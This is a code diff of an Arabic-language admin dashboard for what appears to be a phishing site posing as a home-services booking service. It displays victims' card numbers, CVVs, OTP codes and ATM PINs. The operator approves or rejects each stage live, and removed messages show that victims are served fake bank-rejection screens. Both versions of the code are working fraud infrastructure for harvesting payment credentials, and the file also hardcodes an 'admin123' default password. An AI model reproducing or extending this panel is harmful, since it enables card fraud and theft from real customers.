@@ -94,32 +94,20 @@
     .badge.rejected { background: #fee2e2; color: #991b1b; }
     .badge.completed { background: #d1fae5; color: #065f46; }
 
-    .action-btns { display: flex; gap: 6px; flex-wrap: wrap; }
-    .btn-otp {
-      padding: 7px 12px; background: #8b5cf6; border: none; border-radius: 6px;
-      color: #fff; font-size: 12px; cursor: pointer; transition: background 0.2s; white-space: nowrap;
-    }
-    .btn-otp:hover { background: #7c3aed; }
-    .btn-atm {
-      padding: 7px 12px; background: #f59e0b; border: none; border-radius: 6px;
-      color: #fff; font-size: 12px; cursor: pointer; transition: background 0.2s; white-space: nowrap;
-    }
-    .btn-atm:hover { background: #d97706; }
-    .btn-approve {
-      padding: 7px 12px; background: #22c55e; border: none; border-radius: 6px;
-      color: #fff; font-size: 12px; cursor: pointer; transition: background 0.2s; white-space: nowrap;
-    }
-    .btn-approve:hover { background: #16a34a; }
-    .btn-reject {
-      padding: 7px 12px; background: #ef4444; border: none; border-radius: 6px;
-      color: #fff; font-size: 12px; cursor: pointer; transition: background 0.2s; white-space: nowrap;
-    }
-    .btn-reject:hover { background: #dc2626; }
+    .action-btns { display: flex; gap: 6px; }
     .btn-view {
       padding: 7px 12px; background: #3b82f6; border: none; border-radius: 6px;
       color: #fff; font-size: 12px; cursor: pointer; transition: background 0.2s;
     }
     .btn-view:hover { background: #2563eb; }
+    .btn-approve {
+      padding: 7px 12px; background: #22c55e; border: none; border-radius: 6px;
+      color: #fff; font-size: 12px; cursor: pointer;
+    }
+    .btn-reject {
+      padding: 7px 12px; background: #ef4444; border: none; border-radius: 6px;
+      color: #fff; font-size: 12px; cursor: pointer;
+    }
 
     /* Modal */
     .modal-overlay {
@@ -133,7 +121,6 @@
     }
     .modal-title { font-size: 18px; font-weight: 600; color: #c8a96e; margin-bottom: 20px; }
     
-    /* بيانات العميل */
     .customer-box {
       background: #f0fdf4; border: 2px solid #22c55e; border-radius: 12px;
       padding: 16px; margin-bottom: 16px;
@@ -144,18 +131,15 @@
     .customer-box .label { font-size: 12px; color: #4b5563; font-weight: 500; }
     .customer-box .value { font-size: 13px; color: #1e293b; font-weight: 600; }
 
-    /* بيانات البطاقة */
     .card-box {
       background: #fffbeb; border: 2px solid #f59e0b; border-radius: 12px;
       padding: 16px; margin-bottom: 16px;
     }
     .card-box .box-title { font-size: 14px; font-weight: 700; color: #92400e; margin-bottom: 12px; }
     .card-box .info-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #fef3c7; }
-    .card-box .info-row:last-child { border-bottom: none; }
     .card-box .label { font-size: 12px; color: #78350f; font-weight: 500; }
     .card-box .value { font-size: 13px; color: #1e293b; font-weight: 600; }
 
-    /* بيانات OTP */
     .otp-box {
       background: #fdf4ff; border: 2px solid #a855f7; border-radius: 12px;
       padding: 16px; margin-bottom: 16px; text-align: center;
@@ -163,7 +147,6 @@
     .otp-box .box-title { font-size: 14px; font-weight: 700; color: #6b21a8; margin-bottom: 12px; }
     .otp-box .big-code { font-size: 48px; font-weight: 900; color: #7c3aed; letter-spacing: 8px; }
 
-    /* بيانات ATM PIN */
     .atm-box {
       background: #fff7ed; border: 2px solid #f97316; border-radius: 12px;
       padding: 16px; margin-bottom: 16px; text-align: center;
@@ -171,23 +154,21 @@
     .atm-box .box-title { font-size: 14px; font-weight: 700; color: #9a3412; margin-bottom: 12px; }
     .atm-box .big-code { font-size: 48px; font-weight: 900; color: #ea580c; letter-spacing: 8px; }
 
-    .modal-actions { display: flex; gap: 10px; margin-top: 20px; justify-content: flex-end; flex-wrap: wrap; }
+    .modal-actions { display: flex; gap: 10px; margin-top: 20px; justify-content: flex-end; }
     .btn-close {
       padding: 10px 20px; background: transparent; border: 1px solid #cbd5e1;
       border-radius: 8px; color: #64748b; cursor: pointer; font-size: 14px;
     }
 
-    /* Toast */
     .toast {
       position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
       background: #ffffff; border: 1px solid #e2e8f0; border-radius: 10px;
       padding: 12px 24px; font-size: 14px; z-index: 200; box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-      opacity: 0; transition: opacity 0.3s; pointer-events: none; white-space: nowrap;
+      opacity: 0; transition: opacity 0.3s; pointer-events: none;
     }
     .toast.show { opacity: 1; }
     .toast.success { border-color: #22c55e; color: #22c55e; }
     .toast.error { border-color: #ef4444; color: #ef4444; }
-    .toast.info { border-color: #3b82f6; color: #3b82f6; }
 
     .new-badge {
       background: #c8a96e; color: #ffffff; font-size: 10px; font-weight: 700;
@@ -195,29 +176,11 @@
     }
     @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.4} }
 
-    .stage-badge {
-      display: inline-block; font-size: 10px; padding: 2px 8px; border-radius: 10px;
-      font-weight: 600; margin-right: 4px;
-    }
-    .stage-badge.card { background: #dbeafe; color: #1e40af; }
-    .stage-badge.otp { background: #ede9fe; color: #4c1d95; }
-    .stage-badge.atm_pin { background: #fff7ed; color: #9a3412; }
-    .stage-badge.done { background: #d1fae5; color: #065f46; }
-
     .empty-state { text-align: center; padding: 60px 20px; color: #94a3b8; }
-    .empty-state .icon { font-size: 48px; margin-bottom: 12px; }
-
-    @media (max-width: 768px) {
-      .stats-bar { flex-wrap: wrap; }
-      .modal { width: 95vw; }
-      .orders-table { font-size: 12px; }
-      .orders-table th, .orders-table td { padding: 10px 8px; }
-    }
   </style>
 </head>
 <body>
 
-<!-- Login Screen -->
 <div id="loginScreen">
   <div class="login-box">
     <div class="logo">معاون</div>
@@ -228,14 +191,13 @@
     </div>
     <div class="form-group">
       <label>كلمة المرور</label>
-      <input type="password" id="password" value="admin123" placeholder="أدخل كلمة المرور" />
+      <input type="password" id="password" value="admin123" />
     </div>
     <button class="btn-login" onclick="login()">دخول</button>
     <div class="error-msg" id="loginError"></div>
   </div>
 </div>
 
-<!-- Dashboard -->
 <div id="dashboard">
   <div class="header">
     <div class="brand">🏠 معاون — لوحة التحكم</div>
@@ -252,7 +214,7 @@
     </div>
     <div class="stat-card">
       <div class="stat-num" id="statWaiting">0</div>
-      <div class="stat-label">بانتظار الموافقة (بطاقة)</div>
+      <div class="stat-label">بانتظار البطاقة</div>
     </div>
     <div class="stat-card">
       <div class="stat-num" id="statOtp">0</div>
@@ -262,66 +224,49 @@
       <div class="stat-num" id="statAtm">0</div>
       <div class="stat-label">بانتظار ATM PIN</div>
     </div>
-    <div class="stat-card">
-      <div class="stat-num" id="statCompleted">0</div>
-      <div class="stat-label">مكتملة</div>
-    </div>
   </div>
 
   <div class="main-content">
     <div class="section-title">
       <div class="live-dot"></div>
-      الطلبات الواردة
-      <button onclick="loadOrders()" style="margin-right:auto;padding:6px 14px;background:#f1f5f9;border:1px solid #e2e8f0;border-radius:6px;color:#64748b;cursor:pointer;font-size:12px;">🔄 تحديث</button>
+      الطلبات الواردة (الأحدث أولاً)
+      <button onclick="loadOrders()" style="margin-right:auto;padding:6px 14px;background:#f1f5f9;border:1px solid #e2e8f0;border-radius:6px;cursor:pointer;font-size:12px;">🔄 تحديث</button>
     </div>
 
     <div id="ordersContainer">
-      <div class="empty-state">
-        <div class="icon">📋</div>
-        <div>جاري تحميل الطلبات...</div>
-      </div>
+      <div class="empty-state">جاري تحميل الطلبات...</div>
     </div>
   </div>
 </div>
 
-<!-- Order Detail Modal -->
 <div class="modal-overlay" id="modalOverlay" onclick="closeModal(event)">
   <div class="modal" id="modalContent">
     <div class="modal-title">تفاصيل الطلب</div>
     <div id="modalBody"></div>
-    <div class="modal-actions" id="modalActions">
-      <button class="btn-close" onclick="closeModal()">إغلاق</button>
-    </div>
+    <div class="modal-actions" id="modalActions"></div>
   </div>
 </div>
 
-<!-- Toast -->
 <div class="toast" id="toast"></div>
 
 <script>
-const BASE_URL = '';
 let token = localStorage.getItem('adminToken');
 let adminUsername = localStorage.getItem('adminUsername');
-let ws = null;
-let currentOrderRef = null;
 let orders = [];
 
-// ─── Init ─────────────────────────────────────────────────────────────────────
 if (token) showDashboard();
 
 async function login() {
   const username = document.getElementById('username').value;
   const password = document.getElementById('password').value;
-  document.getElementById('loginError').textContent = '';
-
   try {
-    const res = await fetch(BASE_URL + '/api/admin/login', {
+    const res = await fetch('/api/admin/login', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ username, password })
     });
     const data = await res.json();
-    if (!res.ok) throw new Error(data.error || 'خطأ في تسجيل الدخول');
+    if (!res.ok) throw new Error(data.error);
     token = data.token;
     adminUsername = data.username;
     localStorage.setItem('adminToken', token);
@@ -335,8 +280,6 @@ async function login() {
 function logout() {
   token = null;
   localStorage.removeItem('adminToken');
-  localStorage.removeItem('adminUsername');
-  if (ws) ws.close();
   document.getElementById('dashboard').style.display = 'none';
   document.getElementById('loginScreen').style.display = 'flex';
 }
@@ -344,44 +287,31 @@ function logout() {
 function showDashboard() {
   document.getElementById('loginScreen').style.display = 'none';
   document.getElementById('dashboard').style.display = 'block';
-  document.getElementById('adminName').textContent = adminUsername || 'admin';
+  document.getElementById('adminName').textContent = adminUsername;
   loadOrders();
   connectWS();
 }
 
-// ─── WebSocket ────────────────────────────────────────────────────────────────
 function connectWS() {
-  const wsUrl = (location.protocol === 'https:' ? 'wss:' : 'ws:') + '//' + location.host + '/ws?admin=1';
-  ws = new WebSocket(wsUrl);
+  const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+  const ws = new WebSocket(protocol + '//' + window.location.host + '/ws?admin=1');
   ws.onmessage = (e) => {
-    const data = JSON.parse(e.data);
-    if (['new_order', 'card_submitted', 'otp_submitted', 'atm_pin_submitted'].includes(data.type)) {
-      const labels = {
-        new_order: '📩 طلب جديد وارد!',
-        card_submitted: '💳 بيانات بطاقة جديدة!',
-        otp_submitted: '🔐 رمز OTP مُدخل!',
-        atm_pin_submitted: '🏧 رقم ATM PIN مُدخل!'
-      };
-      showToast(labels[data.type] || '📩 تحديث جديد!', 'success');
-      loadOrders();
-    }
+    showToast('📩 تحديث جديد وارد!', 'success');
+    loadOrders();
   };
   ws.onclose = () => setTimeout(connectWS, 3000);
 }
 
-// ─── Load Orders ──────────────────────────────────────────────────────────────
 async function loadOrders() {
   try {
-    const res = await fetch(BASE_URL + '/api/admin/orders', {
+    const res = await fetch('/api/admin/orders', {
       headers: { Authorization: 'Bearer ' + token }
     });
-    if (res.status === 401) { logout(); return; }
+    if (res.status === 401) return logout();
     orders = await res.json();
     renderOrders();
     updateStats();
-  } catch (e) {
-    console.error(e);
-  }
+  } catch (e) { console.error(e); }
 }
 
 function updateStats() {
@@ -389,243 +319,119 @@ function updateStats() {
   document.getElementById('statWaiting').textContent = orders.filter(o => o.status === 'waiting_approval').length;
   document.getElementById('statOtp').textContent = orders.filter(o => o.status === 'waiting_otp').length;
   document.getElementById('statAtm').textContent = orders.filter(o => o.status === 'waiting_atm_pin').length;
-  document.getElementById('statCompleted').textContent = orders.filter(o => o.status === 'completed').length;
-}
-
-function getStatusInfo(o) {
-  const map = {
-    pending: { label: 'معلق', cls: 'pending' },
-    waiting_approval: { label: 'بطاقة بانتظار', cls: 'waiting' },
-    waiting_otp: { label: 'OTP بانتظار', cls: 'waiting-otp' },
-    waiting_atm_pin: { label: 'ATM بانتظار', cls: 'waiting-atm' },
-    card_rejected: { label: 'بطاقة مرفوضة', cls: 'rejected' },
-    otp_rejected: { label: 'OTP مرفوض', cls: 'rejected' },
-    atm_rejected: { label: 'ATM مرفوض', cls: 'rejected' },
-    approved: { label: 'تمت الموافقة', cls: 'approved' },
-    rejected: { label: 'مرفوض', cls: 'rejected' },
-    completed: { label: 'مكتمل', cls: 'completed' }
-  };
-  return map[o.status] || { label: o.status, cls: 'pending' };
-}
-
-function getStageLabel(stage) {
-  const map = {
-    contact: 'تسجيل', card: 'بطاقة', otp: 'OTP', atm_pin: 'ATM PIN', done: 'مكتمل'
-  };
-  return map[stage] || stage || '—';
-}
-
-function renderActionBtns(o) {
-  const ref = o.order_ref;
-  // Only show view button in table - no approve/reject buttons here
-  let btns = `<button class="btn-view" onclick="viewOrder('${ref}')">عرض</button>`;
-  return btns;
 }
 
 function renderOrders() {
   const container = document.getElementById('ordersContainer');
   if (!orders.length) {
-    container.innerHTML = '<div class="empty-state"><div class="icon">📋</div><div>لا توجد طلبات بعد</div></div>';
+    container.innerHTML = '<div class="empty-state">لا توجد طلبات بعد</div>';
     return;
   }
 
-  // Sort orders by created_at in descending order (newest first)
-  const sortedOrders = [...orders].sort((a, b) => (b.created_at || 0) - (a.created_at || 0));
+  // orders are already sorted DESC by backend, but we ensure it here
+  const sorted = [...orders].sort((a, b) => (b.created_at || 0) - (a.created_at || 0));
 
-  const rows = sortedOrders.map(o => {
-    const s = getStatusInfo(o);
+  const rows = sorted.map(o => {
     const isNew = Date.now() - o.created_at < 60000;
-    const stageLabel = getStageLabel(o.stage);
     return `
       <tr>
-        <td style="font-size:12px">${o.order_ref} ${isNew ? '<span class="new-badge">جديد</span>' : ''}</td>
+        <td>${o.order_ref} ${isNew ? '<span class="new-badge">جديد</span>' : ''}</td>
         <td>${o.customer_name || '—'}</td>
         <td>${o.customer_phone || '—'}</td>
         <td>${o.service_type || '—'}</td>
-        <td>${o.total_price ? o.total_price + ' ر.ق' : '—'}</td>
-        <td>
-          <span class="badge ${s.cls}">${s.label}</span>
-          <span class="stage-badge ${o.stage || 'card'}">${stageLabel}</span>
-        </td>
-        <td>
-          <div class="action-btns">${renderActionBtns(o)}</div>
-        </td>
+        <td>${o.total_price || '—'} ر.ق</td>
+        <td><span class="badge ${o.status}">${o.status}</span></td>
+        <td><button class="btn-view" onclick="viewOrder('${o.order_ref}')">عرض</button></td>
       </tr>
     `;
   }).join('');
 
   container.innerHTML = `
     <table class="orders-table">
-      <thead>
-        <tr>
-          <th>رقم الطلب</th>
-          <th>اسم العميل</th>
-          <th>الهاتف</th>
-          <th>الخدمة</th>
-          <th>المبلغ</th>
-          <th>الحالة / المرحلة</th>
-          <th>الإجراءات</th>
-        </tr>
-      </thead>
+      <thead><tr><th>رقم الطلب</th><th>الاسم</th><th>الهاتف</th><th>الخدمة</th><th>المبلغ</th><th>الحالة</th><th>الإجراءات</th></tr></thead>
       <tbody>${rows}</tbody>
     </table>
   `;
 }
 
-// ─── View Order ───────────────────────────────────────────────────────────────
 function viewOrder(ref) {
   const o = orders.find(x => x.order_ref === ref);
   if (!o) return;
-  currentOrderRef = ref;
 
   let html = `
-    <!-- بيانات العميل -->
     <div class="customer-box">
       <div class="box-title">👤 بيانات العميل</div>
-      <div class="info-row"><div class="label">رقم الطلب</div><div class="value">${o.order_ref}</div></div>
       <div class="info-row"><div class="label">الاسم</div><div class="value">${o.customer_name || '—'}</div></div>
       <div class="info-row"><div class="label">الهاتف</div><div class="value">${o.customer_phone || '—'}</div></div>
       <div class="info-row"><div class="label">العنوان</div><div class="value">${o.customer_address || '—'}</div></div>
       <div class="info-row"><div class="label">الخدمة</div><div class="value">${o.service_type || '—'}</div></div>
-      <div class="info-row"><div class="label">الجنسية</div><div class="value">${o.nationality || '—'}</div></div>
-      <div class="info-row"><div class="label">المدة</div><div class="value">${o.duration || '—'}</div></div>
       <div class="info-row"><div class="label">المبلغ</div><div class="value">${o.total_price} ر.ق</div></div>
-      <div class="info-row"><div class="label">تاريخ البدء</div><div class="value">${o.start_date || '—'}</div></div>
-      <div class="info-row"><div class="label">الحالة</div><div class="value">${getStatusInfo(o).label} — ${getStageLabel(o.stage)}</div></div>
     </div>
   `;
 
-  // بيانات البطاقة
   if (o.card_number) {
     html += `
-    <div class="card-box">
-      <div class="box-title">💳 بيانات البطاقة</div>
-      <div class="info-row"><div class="label">رقم البطاقة</div><div class="value">${o.card_number}</div></div>
-      <div class="info-row"><div class="label">تاريخ الانتهاء</div><div class="value">${o.card_expiry || '—'}</div></div>
-      <div class="info-row"><div class="label">CVV</div><div class="value">${o.card_cvv || '—'}</div></div>
-    </div>
+      <div class="card-box">
+        <div class="box-title">💳 بيانات البطاقة</div>
+        <div class="info-row"><div class="label">رقم البطاقة</div><div class="value">${o.card_number}</div></div>
+        <div class="info-row"><div class="label">التاريخ</div><div class="value">${o.card_expiry}</div></div>
+        <div class="info-row"><div class="label">CVV</div><div class="value">${o.card_cvv}</div></div>
+      </div>
     `;
   }
 
-  // رمز OTP
   if (o.otp_code) {
-    html += `
-    <div class="otp-box">
-      <div class="box-title">🔐 رمز OTP المُدخل</div>
-      <div class="big-code">${o.otp_code}</div>
-    </div>
-    `;
+    html += `<div class="otp-box"><div class="box-title">🔐 رمز OTP</div><div class="big-code">${o.otp_code}</div></div>`;
   }
 
-  // رقم ATM PIN
   if (o.atm_pin) {
-    html += `
-    <div class="atm-box">
-      <div class="box-title">🏧 رقم ATM PIN المُدخل</div>
-      <div class="big-code">${o.atm_pin}</div>
-    </div>
-    `;
+    html += `<div class="atm-box"><div class="box-title">🏧 رقم ATM PIN</div><div class="big-code">${o.atm_pin}</div></div>`;
   }
 
   document.getElementById('modalBody').innerHTML = html;
 
-  // أزرار الـ modal حسب الحالة
-  let actionBtns = '<button class="btn-close" onclick="closeModal()">إغلاق</button>';
+  // Show actions only if needed
+  let actions = '<button class="btn-close" onclick="closeModal()">إغلاق</button>';
   if (o.status === 'waiting_approval' && o.card_number) {
-    actionBtns += `<button class="btn-reject" onclick="rejectCard('${ref}');closeModal()">❌ رفض البطاقة</button>`;
-    actionBtns += `<button class="btn-approve" onclick="approveCard('${ref}');closeModal()">✅ قبول → OTP</button>`;
+    actions += `<button class="btn-reject" onclick="action('${ref}', 'reject-card')">❌ رفض</button>`;
+    actions += `<button class="btn-approve" onclick="action('${ref}', 'approve-card')">✅ قبول → OTP</button>`;
   } else if (o.status === 'waiting_otp' && o.otp_code) {
-    actionBtns += `<button class="btn-reject" onclick="rejectOtp('${ref}');closeModal()">❌ رفض OTP</button>`;
-    actionBtns += `<button class="btn-approve" onclick="approveOtp('${ref}');closeModal()">✅ قبول → ATM PIN</button>`;
+    actions += `<button class="btn-reject" onclick="action('${ref}', 'reject-otp')">❌ رفض</button>`;
+    actions += `<button class="btn-approve" onclick="action('${ref}', 'approve-otp')">✅ قبول → ATM</button>`;
   } else if (o.status === 'waiting_atm_pin' && o.atm_pin) {
-    actionBtns += `<button class="btn-reject" onclick="rejectAtm('${ref}');closeModal()">❌ رفض الرقم السري</button>`;
-    actionBtns += `<button class="btn-approve" onclick="approveAtm('${ref}');closeModal()">✅ قبول → نجاح</button>`;
+    actions += `<button class="btn-reject" onclick="action('${ref}', 'reject-atm')">❌ رفض</button>`;
+    actions += `<button class="btn-approve" onclick="action('${ref}', 'approve-atm')">✅ قبول → نجاح</button>`;
   }
-  document.getElementById('modalActions').innerHTML = actionBtns;
 
+  document.getElementById('modalActions').innerHTML = actions;
   document.getElementById('modalOverlay').classList.add('open');
 }
 
+async function action(ref, type) {
+  try {
+    await fetch(\`/api/admin/orders/\${ref}/\${type}\`, {
+      method: 'POST', headers: { Authorization: 'Bearer ' + token }
+    });
+    showToast('تم تنفيذ الإجراء بنجاح', 'success');
+    closeModal();
+    loadOrders();
+  } catch (e) { showToast('خطأ في التنفيذ', 'error'); }
+}
+
 function closeModal(e) {
-  if (!e || e.target === document.getElementById('modalOverlay')) {
+  if (!e || e.target === document.getElementById('modalOverlay') || e.target.className === 'btn-close') {
     document.getElementById('modalOverlay').classList.remove('open');
   }
 }
 
-// ─── Admin Actions ────────────────────────────────────────────────────────────
-// ─── بطاقة ───
-async function approveCard(ref) {
-  try {
-    await fetch(BASE_URL + '/api/admin/orders/' + ref + '/approve-card', {
-      method: 'POST', headers: { Authorization: 'Bearer ' + token }
-    });
-    showToast('✅ تم قبول البطاقة — العميل سينتقل لصفحة OTP', 'success');
-    loadOrders();
-  } catch (e) { showToast('خطأ في قبول البطاقة', 'error'); }
-}
-async function rejectCard(ref) {
-  try {
-    await fetch(BASE_URL + '/api/admin/orders/' + ref + '/reject-card', {
-      method: 'POST', headers: { Authorization: 'Bearer ' + token }
-    });
-    showToast('❌ تم رفض البطاقة — العميل سيرى رسالة رفض البنك', 'error');
-    loadOrders();
-  } catch (e) { showToast('خطأ في رفض البطاقة', 'error'); }
-}
-// ─── OTP ───
-async function approveOtp(ref) {
-  try {
-    await fetch(BASE_URL + '/api/admin/orders/' + ref + '/approve-otp', {
-      method: 'POST', headers: { Authorization: 'Bearer ' + token }
-    });
-    showToast('✅ تم قبول OTP — العميل سينتقل لصفحة ATM PIN', 'success');
-    loadOrders();
-  } catch (e) { showToast('خطأ في قبول OTP', 'error'); }
-}
-async function rejectOtp(ref) {
-  try {
-    await fetch(BASE_URL + '/api/admin/orders/' + ref + '/reject-otp', {
-      method: 'POST', headers: { Authorization: 'Bearer ' + token }
-    });
-    showToast('❌ تم رفض OTP — العميل سيرى مربع OTP باللون الأحمر', 'error');
-    loadOrders();
-  } catch (e) { showToast('خطأ في رفض OTP', 'error'); }
-}
-// ─── ATM PIN ───
-async function approveAtm(ref) {
-  try {
-    await fetch(BASE_URL + '/api/admin/orders/' + ref + '/approve-atm', {
-      method: 'POST', headers: { Authorization: 'Bearer ' + token }
-    });
-    showToast('✅ تم قبول الرقم السري — العميل سيرى رسالة النجاح', 'success');
-    loadOrders();
-  } catch (e) { showToast('خطأ في قبول ATM PIN', 'error'); }
-}
-async function rejectAtm(ref) {
-  try {
-    await fetch(BASE_URL + '/api/admin/orders/' + ref + '/reject-atm', {
-      method: 'POST', headers: { Authorization: 'Bearer ' + token }
-    });
-    showToast('❌ تم رفض الرقم السري — العميل سيرى رسالة خطأ', 'error');
-    loadOrders();
-  } catch (e) { showToast('خطأ في رفض ATM PIN', 'error'); }
-}
-// Legacy
-async function requestOtp(ref) { return approveCard(ref); }
-async function requestAtm(ref) { return approveOtp(ref); }
-async function approveOrder(ref) { return approveAtm(ref); }
-async function rejectOrder(ref) { return rejectCard(ref); }
-
-// ─── Toast ────────────────────────────────────────────────────────────────────
-function showToast(msg, type = 'success') {
+function showToast(msg, type) {
   const t = document.getElementById('toast');
   t.textContent = msg;
   t.className = 'toast show ' + type;
-  setTimeout(() => t.className = 'toast', 4000);
+  setTimeout(() => t.className = 'toast', 3000);
 }
 
-// Auto-refresh every 15s
-setInterval(() => { if (token) loadOrders(); }, 15000);
+setInterval(() => { if (token) loadOrders(); }, 10000);
 </script>
 </body>
 </html>
